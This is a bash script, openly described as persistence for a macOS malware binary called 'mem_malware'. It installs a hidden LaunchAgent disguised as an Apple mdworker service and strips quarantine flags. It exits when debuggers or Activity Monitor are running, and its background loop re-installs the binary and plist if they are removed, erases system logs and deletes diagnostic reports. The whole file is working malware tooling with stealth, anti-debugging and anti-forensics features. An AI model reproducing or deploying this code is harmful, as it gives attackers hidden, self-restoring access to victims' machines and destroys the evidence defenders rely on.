#!/usr/bin/env bash
#
# Enhanced LaunchAgent persistence for mem_malware: stealth, anti-forensics, self-heal, anti-debug, operator control
# Danger Level: ★★★★★

LABEL="com.apple.mdworker.bismillah" # Obfuscated label
PLIST_PATH="$HOME/Library/LaunchAgents/.com.apple.mdworker.bismillah.plist" # Hidden plist
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SCRIPT_NAME="mem_malware"
SOURCE="$SCRIPT_DIR/$SCRIPT_NAME"
DEST_DIR="$HOME/Library/Application Support/.bismillah/.cache"
DEST="$DEST_DIR/.${SCRIPT_NAME}d"
MAGIC_KILL_FILE="$HOME/.bismillah_kill"

# --- Anti-debugging: exit if under analysis ---
for tool in "lldb" "gdb" "fs_usage" "dtruss" "Instruments" "Activity Monitor"; do
  if pgrep -x "$tool" >/dev/null; then
    exit 0
  fi
done

# --- Ensure destination directory and hide binary ---
mkdir -p "$DEST_DIR"
if [ ! -f "$DEST" ]; then
  cp "$SOURCE" "$DEST"
  chmod +x "$DEST"
fi
chflags hidden "$DEST" 2>/dev/null
xattr -d com.apple.quarantine "$DEST" 2>/dev/null

# --- Create hidden LaunchAgent plist if missing or modified ---
create_plist() {
  cat <<EOF > "$PLIST_PATH"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
   <key>Label</key>
   <string>${LABEL}</string>
   <key>ProgramArguments</key>
   <array>
      <string>${DEST}</string>
   </array>
   <key>RunAtLoad</key>
   <true/>
   <key>KeepAlive</key>
   <true/>
</dict>
</plist>
EOF
  chflags hidden "$PLIST_PATH" 2>/dev/null
  xattr -d com.apple.quarantine "$PLIST_PATH" 2>/dev/null
  launchctl bootout gui/$(id -u) "$PLIST_PATH" 2>/dev/null
  launchctl bootstrap gui/$(id -u) "$PLIST_PATH"
}

if [ ! -f "$PLIST_PATH" ]; then
  create_plist
fi

# --- Self-heal background loop (disowned, hidden output) ---
(
  while true; do
    # Operator kill switch
    if [ -f "$MAGIC_KILL_FILE" ]; then
      launchctl bootout gui/$(id -u) "$PLIST_PATH" 2>/dev/null
      rm -f "$PLIST_PATH" "$DEST" "$MAGIC_KILL_FILE"
      exit 0
    fi

    # Restore binary if missing or changed
    if [ ! -f "$DEST" ]; then
      cp "$SOURCE" "$DEST"
      chmod +x "$DEST"
      chflags hidden "$DEST" 2>/dev/null
      xattr -d com.apple.quarantine "$DEST" 2>/dev/null
    else
      SRC_SUM=$(shasum -a 256 "$SOURCE" | awk '{print $1}')
      DST_SUM=$(shasum -a 256 "$DEST" | awk '{print $1}')
      if [ "$SRC_SUM" != "$DST_SUM" ]; then
        cp "$SOURCE" "$DEST"
        chmod +x "$DEST"
        chflags hidden "$DEST" 2>/dev/null
        xattr -d com.apple.quarantine "$DEST" 2>/dev/null
      fi
    fi

    # Restore LaunchAgent if missing or changed
    if [ ! -f "$PLIST_PATH" ] || ! grep -q "$LABEL" "$PLIST_PATH"; then
      create_plist
    fi

    # Anti-forensics: wipe logs
    log erase --all --force 2>/dev/null
    rm -f "$HOME/Library/Logs/DiagnosticReports/${SCRIPT_NAME}*" 2>/dev/null

    sleep 120
  done
) >/dev/null 2>&1 & disown
